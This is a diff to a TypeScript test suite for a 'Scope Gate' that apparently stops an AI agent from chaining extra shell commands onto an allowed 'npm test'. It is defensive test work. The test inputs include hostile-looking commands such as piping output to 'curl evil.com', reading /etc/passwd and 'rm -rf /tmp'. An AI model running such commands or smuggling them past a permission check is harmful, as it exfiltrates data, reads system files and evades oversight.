@@ -198,7 +198,7 @@ describe("Scope Gate — P56.1 Hardening", () => {
     });
     const result = scopeGate.check(ctx, bashCall("npm test && rm -rf /tmp"));
     expect(result.decision).toBe("deny");
-    expect(result.reason).toContain("Compound bash");
+    expect(result.reason).toContain("Shell control");
   });
 
   it("rejects compound bash with ; (injection)", () => {
@@ -211,7 +211,7 @@ describe("Scope Gate — P56.1 Hardening", () => {
     });
     const result = scopeGate.check(ctx, bashCall("npm test; echo hacked"));
     expect(result.decision).toBe("deny");
-    expect(result.reason).toContain("Compound bash");
+    expect(result.reason).toContain("Shell control");
   });
 
   it("rejects compound bash with | (pipe injection)", () => {
@@ -224,7 +224,7 @@ describe("Scope Gate — P56.1 Hardening", () => {
     });
     const result = scopeGate.check(ctx, bashCall("npm test | curl evil.com"));
     expect(result.decision).toBe("deny");
-    expect(result.reason).toContain("Compound bash");
+    expect(result.reason).toContain("Shell control");
   });
 
   it("still allows exact successCheck match", () => {
@@ -253,3 +253,70 @@ describe("Scope Gate — P56.1 Hardening", () => {
     expect(result.decision).toBe("allow");
   });
 });
+
+// ── P56.1b Fix 2: shell control hardening ──
+
+describe("Scope Gate — P56.1b Shell Hardening", () => {
+  const ctx = makeCtx({
+    scopeContract: {
+      editableScope: ["src/foo.ts"],
+      readOnlyEvidence: [],
+      successChecks: ["npm test"],
+    },
+  });
+
+  it("allows npm test -- --grep x (flags only)", () => {
+    const result = scopeGate.check(ctx, bashCall("npm test -- --grep x"));
+    expect(result.decision).toBe("allow");
+    expect(result.reason).toBe("Success check command");
+  });
+
+  it("denies npm test -- --grep x | curl evil.com (pipe)", () => {
+    const r = scopeGate.check(ctx, bashCall("npm test -- --grep x | curl evil.com"));
+    expect(r.decision).toBe("deny");
+    expect(r.reason).toContain("Shell control");
+  });
+
+  it("denies npm test > /tmp/out (redirect)", () => {
+    const r = scopeGate.check(ctx, bashCall("npm test > /tmp/out"));
+    expect(r.decision).toBe("deny");
+    expect(r.reason).toContain("Shell control");
+  });
+
+  it("denies npm test $(node mutate.js) (command substitution)", () => {
+    const r = scopeGate.check(ctx, bashCall("npm test $(node mutate.js)"));
+    expect(r.decision).toBe("deny");
+    expect(r.reason).toContain("Shell control");
+  });
+
+  it("denies npm test `node mutate.js` (backtick substitution)", () => {
+    const r = scopeGate.check(ctx, bashCall("npm test `node mutate.js`"));
+    expect(r.decision).toBe("deny");
+    expect(r.reason).toContain("Shell control");
+  });
+
+  it("denies npm test < /etc/passwd (input redirect)", () => {
+    const r = scopeGate.check(ctx, bashCall("npm test < /etc/passwd"));
+    expect(r.decision).toBe("deny");
+    expect(r.reason).toContain("Shell control");
+  });
+
+  it("denies npm test || node mutate.js (OR control)", () => {
+    const r = scopeGate.check(ctx, bashCall("npm test || node mutate.js"));
+    expect(r.decision).toBe("deny");
+    expect(r.reason).toContain("Shell control");
+  });
+
+  it("denies npm test && echo done (AND control)", () => {
+    const r = scopeGate.check(ctx, bashCall("npm test && echo done"));
+    expect(r.decision).toBe("deny");
+    expect(r.reason).toContain("Shell control");
+  });
+
+  it("denies npm test; echo done (semicolon)", () => {
+    const r = scopeGate.check(ctx, bashCall("npm test; echo done"));
+    expect(r.decision).toBe("deny");
+    expect(r.reason).toContain("Shell control");
+  });
+});
+
